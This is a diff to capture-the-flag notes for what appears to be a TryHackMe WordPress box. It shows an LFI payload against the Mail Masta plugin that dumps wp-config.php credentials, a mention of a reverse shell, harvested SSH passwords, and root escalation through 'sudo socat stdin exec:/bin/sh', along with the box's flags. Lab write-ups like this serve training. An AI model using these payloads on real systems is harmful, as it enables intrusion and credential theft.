@@ -71,7 +71,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 #### in /hackathons found
 
-
+## 1.way
 Damn how much I hate the smell of Vinegar
 
 Dvc W@iyur@123 
@@ -257,7 +257,78 @@ ________________________________________________
 /usr/share/adduser/adduser.conf [Status: 500, Size: 3028, Words: 402, Lines: 89, Duration: 72ms]
 :: Progress: [878/878] :: Job [1/1] :: 421 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
 
+## 2.way
+http://10.10.143.12/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
+decode base64 
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'elyana' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'H@ckme@123' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+
+
+
+
 
 login to wordpress as elyana psw H@ckme@123 
+did reverse shell via template modification
+run linpease
+found 
+
+bash-4.4$ cat /etc/mysql/conf.d/private.txt
+cat /etc/mysql/conf.d/private.txt
+user: elyana
+password: E@syR18ght
+
+└─$ ssh elyana@10.10.42.166
+elyana@10.10.42.166's password: E@syR18ght
+
+
+bash-4.4$ cat user.txt
+cat user.txt
+VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
+decode base64
+THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
+
+### privilage escalation
+╔══════════╣ SGID
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
+-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd                                               
+-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd
+-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
+-rwsr-sr-x 1 root root 59K Jan 18  2018 /bin/chmod
+-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
+-rwsr-sr-x 1 root root 11M Nov 23  2018 /usr/bin/lxc (Unknown SGID binary)
+-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall
+-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
+-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
+-rwsr-sr-x 1 root root 392K Apr  4  2018 /usr/bin/socat
+-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
+-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
+-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+
+
+
+$ sudo /usr/bin/socat stdin exec:/bin/sh
+sudo /usr/bin/socat stdin exec:/bin/sh
+id
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat root.txt
+VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
+
 
 <\code>
